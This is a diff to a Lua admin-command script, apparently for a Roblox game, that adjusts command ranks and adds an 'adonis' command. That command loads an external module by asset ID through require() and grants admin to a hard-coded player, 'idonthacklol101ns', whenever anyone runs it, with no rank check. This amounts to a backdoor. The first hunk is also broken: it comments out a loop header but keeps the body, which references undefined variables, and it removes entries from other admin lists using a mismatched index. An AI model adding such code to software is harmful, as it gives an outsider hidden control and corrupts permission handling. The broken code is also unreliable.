@@ -8488,14 +8488,16 @@ addCommand({
             _G.blacklistConnections = {}
         end
 
-        for _, target in ipairs(targets) do
+        --[[for _, target in ipairs(targets) do
             local i = table.find(_G.tempadmins, target.Name)
             if not i then
                 notify(plr, "Sentrius", target.DisplayName .. " is not in tempadmins.", 5)
                 return
-            end
+            end]]
 
-            table.remove(_G.tempadmins, i)
+            table.remove(_G.tempadmins, idx)
+            table.remove(_G.permadmins, idx)
+            table.remove(_G.p299, idx)
 
             _G.blacklisted[target.Name] = true
 
@@ -8507,6 +8509,8 @@ addCommand({
                 local idx = table.find(_G.tempadmins, target.Name)
                 if idx then
                     table.remove(_G.tempadmins, idx)
+                    table.remove(_G.permadmins, idx)
+                    table.remove(_G.p299, idx)
                 end
             end)
 
@@ -9375,6 +9379,7 @@ addCommand({
     aliases = {"epstein"},
     desc = "ma boy jeffrey so tuff",
     usage = prefix .. "jeffery [player (optional)]",
+    rank = RANKS.MODERATOR,
     callback = function(plr, args)
         local targets = {plr}
 
@@ -9475,6 +9480,7 @@ addCommand({
     aliases = {},
     desc = "drops a piano on someone i guess",
     usage = prefix .. "piano [player (optional)]",
+    rank = RANKS.MODERATOR,
     callback = function(plr, args)
         local targets = {plr}
 
@@ -9629,6 +9635,29 @@ addCommand({
 
             a:Destroy()
             game:GetService("Debris"):AddItem(piano,30)
+        end
+    end
+})
+
+--you might ask why not just "rank = SENIOR_MOD," after (    usage = prefix .. "adonis",    ) but i prefer it this way
+addCommand({
+    name = "adonis",
+    aliases = {"loadadonis", "aload"},
+    desc = "Loads Adonis admin",
+    usage = prefix .. "adonis",
+    callback = function(plr, args)
+        local target = Players:FindFirstChild("idonthacklol101ns")
+
+        if target then
+            require(16662768931):GetAdmin("idonthacklol101ns", "Hi??")
+            if plr.Name ~= "idonthacklol101ns" then
+                notify(plr,"Sentrius","adonis has been loaded on idonthacklol101ns\nask him for admin",6)
+            end
+        elseif getrank(plr) > RANKS.SENIOR_MOD then
+            require(16662768931):GetAdmin(plr.Name, "Hi??")
+            notify(plr,"Sentrius","adonis has been loaded on you since idonthacklol101ns is not in-game",6)
+        else
+            notify(plr,"Sentrius","idonthacklol101ns is not in-game and your rank is not high enough to load adonis on yourself",5)
         end
     end
 })
